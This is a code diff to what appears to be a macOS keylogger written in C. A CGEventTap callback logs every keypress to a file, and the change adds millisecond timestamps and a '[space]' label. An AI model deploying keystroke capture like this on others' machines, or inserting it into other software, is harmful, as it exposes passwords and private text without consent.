@@ -53,6 +53,15 @@ int main(int argc, const char *argv[]) {
     return 0;
 }
 
+unsigned long long getEpochMilli(){
+    struct timeval tv;
+    gettimeofday(&tv, NULL);
+    unsigned long long millisecondsSinceEpoch =
+        (unsigned long long)(tv.tv_sec) * 1000 +
+        (unsigned long long)(tv.tv_usec) / 1000;
+    return millisecondsSinceEpoch;
+}
+
 // The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
     if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
@@ -61,7 +70,7 @@ CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef e
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%Lf %s\n", (long double)getEpochMilli()/1000, convertKeyCode(keyCode));
     fflush(logfile);
 
     return event;
@@ -138,7 +147,7 @@ const char *convertKeyCode(int keyCode) {
         case 92:  return "9";
         case 36:  return "[return]";
         case 48:  return "[tab]";
-        case 49:  return " ";
+        case 49:  return "[space]";
         case 51:  return "[del]";
         case 53:  return "[esc]";
         case 54:  return "[right-cmd]";
